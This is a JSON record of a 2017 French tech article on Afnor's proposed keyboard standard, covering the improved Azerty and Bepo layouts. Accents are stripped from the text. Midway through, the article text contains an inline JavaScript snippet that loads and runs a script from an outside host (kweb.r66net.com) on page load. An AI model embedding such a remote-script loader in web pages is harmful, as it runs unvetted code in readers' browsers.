{"title": "Azerty : le clavier francais va changer", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-06-08", "content": "L'Afnor a lance une consultation publique sur une evolution du clavier azerty pour l'adapter aux specificites de la langue francaise. Deux versions << Azerty ameliore >> ou << Bepo >> sont proposees. Le grand public a jusqu'au 9 juillet pour donner son avis. Ce qu'il faut retenir En France, le clavier informatique Azerty n'a jamais ete normalise. La norme Afnor comprendra deux modeles de claviers pour lesquels le grand public est invite a donner leur avis. Plus d'un siecle apres son introduction en France, le clavier en disposition dite Azerty s'apprete a beneficier d'une norme officielle, adaptee a la langue de Moliere. Sous l'impulsion du ministere de la Culture (voir le  rapport  de la Delegation generale a la langue francaise et aux langues de France), l'Afnor ( Association francaise de normalisation ) vient d'ouvrir une enquete publique qui invite quiconque le souhaite a donner son avis sur le projet d'evolution du  clavier  informatique francais. Les contributeurs peuvent prendre connaissance des propositions et suggerer des ameliorations sur la page speciale creee par l' Afnor . Cette consultation durera jusqu'au 9 juillet. Apres quoi la norme, numerotee NF Z71-300, sera publiee en septembre. <<  Elle pourra etre utilisee par les fabricants mais aussi mentionnee comme reference dans le cadre d'appels d'offres publics ou prives  >>, precise l'Afnor dans son communique.  \" Il est des lors presque impossible d'ecrire en francais correctement avec un clavier commercialise en France. En France, jusqu'a present, la disposition Azerty n'a fait l'objet d'aucune normalisation. Petit rappel historique. La disposition de clavier Azerty est arrivee en France a la fin du XIX e  siecle. A l'epoque, il s'agissait d'une variante du clavier Qwerty developpe aux Etats-Unis pour les  machines a ecrire  et brevete en 1878. La disposition Qwerty ne repond pas a des regles ergonomiques pour faciliter la frappe mais aux contraintes mecaniques des machines a ecrire de l'epoque. En effet, les fabricants avaient constate qu'avec un clavier organise par ordre alphabetique, les tiges venant frapper les caracteres sur le papier avaient tendance a se coincer entre elles, ce qui obligeait a taper tres lentement. De la est nee la disposition Qwerty, qui intercale les lettres moins utilisees entre celles qui le sont le plus. Cet arrangement a permis de gagner enormement en  vitesse  de frappe.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Apporter plus de confort de frappe Les participants a l'enquete publique de l'Afnor n'ont pas a choisir, ils sont invites a s'exprimer sur les deux projets qui feront partie de la norme volontaire. Les fabricants de claviers informatiques et les usagers seront ensuite libres de choisir le modele qui leur convient le mieux. Le premier modele propose une evolution en douceur de la disposition Azerty. L'emplacement des lettres et des chiffres ne change pas, mais on facilite la creation des lettres majuscules accentuees et la possibilite de mettre un point sans utiliser la touche Maj. Par ailleurs, le sigle de l'arobase (@) est place sur la touche A, les ligatures << ae>> et << oe >> trouvent place respectivement sur les touches Z et O, tandis que le << u >> et le << c >> s'installent sur les touches U et C. Dans la rangee horizontale superieure du  clavier  qui comporte les chiffres, les symboles et les lettres minuscules accentuees, les << a >>, << e >>, << e >> et << e >> se retrouvent respectivement sur les touches 1, 2, 3 et 4. En haut, la version francisee du clavier Azerty. En dessous, le clavier Bepo qui propose une disposition radicalement differente. (c) Afnor, Bepo                               Selon l'Afnor, cette disposition Azerty <<  s'appuie sur les recherches d'une universite finlandaise qui a developpe une simulation de saisie en integrant les pratiques d'utilisateurs tapant, avec trois comme dix doigts  >>. L'idee est d'apporter un confort de frappe plus adapte au francais et aux langues latines en general sans pour autant bouleverser trop fortement les habitudes des utilisateurs. Ce qui n'est pas le cas du second modele de  clavier  qui marque une rupture assez importante. Le clavier Bepo pense pour reduire la fatigue musculaire Le clavier dit << Bepo >> remplace les touches Azerty par cette nouvelle combinaison. Cette version, qui est en  gestation  depuis 2003, a pour principe de placer les lettres les plus frequemment employees sur les touches les plus accessibles. Resultat, la distance parcourue par les doigts sur un  clavier Bepo  est deux fois moindre que sur un clavier Azerty. Pour ce faire, les lettres les plus courantes sont disposees sur la rangee du milieu aussi appelee ligne de repos : la serie AUIE sur la gauche et la serie TSRN sur la droite. Les deux tiers de la saisie se font sur cette ligne de repos contre seulement 20 % sur un clavier Azerty. Le clavier Bepo dispose bien entendu des caracteres specifiques au francais (a, ae, c, e, e, oe, u, << >>,...). Selon ses promoteurs, le principal benefice de la disposition Bepo est qu'elle contribue a reduire la fatigue musculaire et les risques de troubles musculosquelettiques. Mais la courbe d'apprentissage de ce clavier est evidemment plus importante. Au final, si la norme Afnor ne sera pas imposee aux fabricants de claviers, il est a esperer que certains joueront le jeu afin d'offrir une vraie alternative aux consommateurs. ", "theme": "tech"}